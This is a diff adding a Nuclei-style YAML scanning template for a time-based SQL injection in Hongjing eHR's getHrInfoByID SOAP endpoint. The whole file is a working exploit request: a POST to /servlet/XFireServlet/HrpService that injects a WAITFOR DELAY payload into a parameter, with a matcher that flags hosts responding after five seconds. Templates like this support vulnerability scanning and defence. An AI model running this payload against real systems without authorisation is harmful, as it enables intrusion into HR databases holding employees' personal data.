@@ -1,0 +1,51 @@
+id: hjsoft-getHrInfoByID-sqli
+info:
+  name: 宏景eHR getHrInfoByID SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59111/
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,hjsoft
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /servlet/XFireServlet/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 474
+        Connection: close
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <hrp:getHrInfoByID>
+                <hrp:in0>1</hrp:in0>
+                <hrp:in1>1'WAITFOR DELAY '0:0:5'</hrp:in1>
+                <hrp:in2>1</hrp:in2>
+                <hrp:in3>1</hrp:in3>
+                <hrp:in4>1</hrp:in4>
+                <hrp:in5>1</hrp:in5>
+                <hrp:in6>1</hrp:in6>
+              </hrp:getHrInfoByID>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'getHrInfoByIDResponse')
+          # - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
